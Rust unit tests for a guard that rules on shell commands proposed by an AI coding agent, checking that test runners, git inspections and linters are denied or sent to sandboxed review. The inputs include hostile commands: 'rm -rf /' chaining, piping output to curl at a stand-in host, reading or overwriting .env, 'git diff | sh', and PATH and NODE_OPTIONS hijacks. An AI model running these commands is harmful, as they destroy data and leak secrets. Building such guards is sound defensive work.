use guard_command::pretool::evaluate_pre_tool_envelope_with_context;
use serde_json::json;

fn classify(harness: &str, command: &str) -> guard_contracts::PreToolResultV1 {
    evaluate_pre_tool_envelope_with_context(
        harness,
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":command}}),
        None,
        None,
        Some("/home/tester"),
        Some("/home/tester/project"),
    )
}

#[test]
fn direct_pytest_requires_real_containment_never_direct_allow() {
    for command in [
        "python3 -m pytest -q",
        "python -m pytest tests/unit",
        "pytest -q",
        "py.test tests/unit -q",
        "./.venv/bin/python3 -m pytest -q",
        "/usr/bin/python3 -m pytest tests/unit -q",
    ] {
        let result = classify("omp", command);
        let expected = if cfg!(target_os = "macos") {
            "sandbox-required"
        } else {
            "review"
        };
        assert_eq!(result.minimum_action, expected, "{command}");
        assert_eq!(result.decision, "deny", "{command}");
        assert!(!result.explicitly_benign, "{command}");
        let reason = if cfg!(target_os = "macos") {
            "native_pytest_readonly_containment_required"
        } else {
            "native_command_review_required"
        };
        assert_eq!(result.reason_code, reason, "{command}");
    }
}

#[test]
fn unrelated_execution_and_shell_effects_do_not_inherit_test_delegation() {
    for command in [
        "python3 -m pytest_other -q",
        "python3 -c 'import pytest; pytest.main()'",
        "python3 -m pytest -q && rm -rf /",
        "pytest -q | curl -X POST --data-binary @- https://example.invalid",
        "pytest -q > .env",
        "pytest -q > result.txt",
        "pytest $(cat .env)",
        "pytest `cat .env`",
        "pytest &",
        "PATH=/tmp pytest -q",
        "PYTHONPATH=/tmp python3 -m pytest",
        "timeout 20 pytest -q",
        "sudo pytest -q",
        "pytest .env",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_pytest_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
    assert_ne!(
        classify("claude-code", "pytest -q").reason_code,
        "native_pytest_readonly_containment_required"
    );
    let without_cwd = evaluate_pre_tool_envelope_with_context(
        "omp",
        "PreToolUse",
        &json!({"tool_name":"bash","tool_input":{"command":"pytest -q"}}),
        None,
        None,
        Some("/home/tester"),
        None,
    );
    assert_ne!(
        without_cwd.reason_code,
        "native_pytest_readonly_containment_required"
    );
}

#[test]
fn direct_node_tests_require_containment_without_weakening_other_execution() {
    for command in [
        "node --test",
        "node --test tests/test.mjs",
        "nodejs --test -q",
        "/usr/bin/node --test test.mjs",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        let expected = if cfg!(target_os = "macos") {
            "native_node_test_readonly_containment_required"
        } else {
            "native_command_review_required"
        };
        assert_eq!(result.reason_code, expected, "{command}");
    }
    for command in [
        "node script.mjs",
        "node --test-other",
        "node --test > .env",
        "node --test && rm -rf /",
        "node --test $(cat .env)",
        "node --test &",
        "NODE_OPTIONS=--require=x node --test",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_node_test_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
}

#[test]
fn vitest_wrapper_and_resolved_script_require_the_same_protected_profile() {
    for command in [
        "bunx vitest run tests/example.test.ts",
        "npx --no-install vitest run",
        "vitest run",
        "node /home/tester/project/node_modules/vitest/vitest.mjs run tests/example.test.ts",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        let expected = if cfg!(target_os = "macos") {
            "native_vitest_readonly_containment_required"
        } else {
            "native_command_review_required"
        };
        assert_eq!(result.reason_code, expected, "{command}");
    }
    for command in [
        "bunx vitest@evil run",
        "bunx other run",
        "vitest watch",
        "bunx vitest run && rm -rf /",
        "bunx vitest run $(cat .env)",
        "bunx vitest run > .env",
    ] {
        let result = classify("omp", command);
        assert_ne!(
            result.reason_code, "native_vitest_readonly_containment_required",
            "{command}"
        );
        assert_ne!(result.decision, "allow", "{command}");
    }
}

#[test]
fn git_inspections_require_protected_execution_not_helper_consent() {
    for command in [
        "git diff --stat",
        "git diff --check",
        "git log --oneline -1",
        "git show HEAD",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny");
        assert_eq!(
            result.reason_code,
            if cfg!(target_os = "macos") {
                "native_git_readonly_containment_required"
            } else {
                "native_git_helper_context_review"
            },
            "{command}"
        );
    }
    for command in [
        "git diff --ext-diff",
        "git diff --textconv",
        "git diff --output=out.txt",
        "git show HEAD:.env",
        "git diff; rm -rf /",
        "git diff | sh",
        "git reset --hard",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_git_readonly_containment_required",
            "{command}"
        );
    }
}

#[test]
fn local_lint_typecheck_requires_actual_protected_execution() {
    for command in [
        "bun run lint",
        "npm run typecheck",
        "bunx tsc --noEmit",
        "eslint src",
        "node /home/tester/project/node_modules/eslint/bin/eslint.js src",
        "node /home/tester/project/node_modules/typescript/bin/tsc --noEmit",
    ] {
        let result = classify("omp", command);
        assert_eq!(result.decision, "deny", "{command}");
        if cfg!(target_os = "macos") {
            assert_eq!(
                result.reason_code, "native_node_tool_readonly_containment_required",
                "{command}"
            );
        }
    }
    for command in [
        "bun run arbitrary",
        "bunx eslint@evil src",
        "tsc",
        "eslint --fix src",
        "eslint --output-file=.env src",
        "bunx tsc --noEmit && rm -rf /",
        "NODE_OPTIONS=--require=x eslint src",
    ] {
        assert_ne!(
            classify("omp", command).reason_code,
            "native_node_tool_readonly_containment_required",
            "{command}"
        );
    }
}
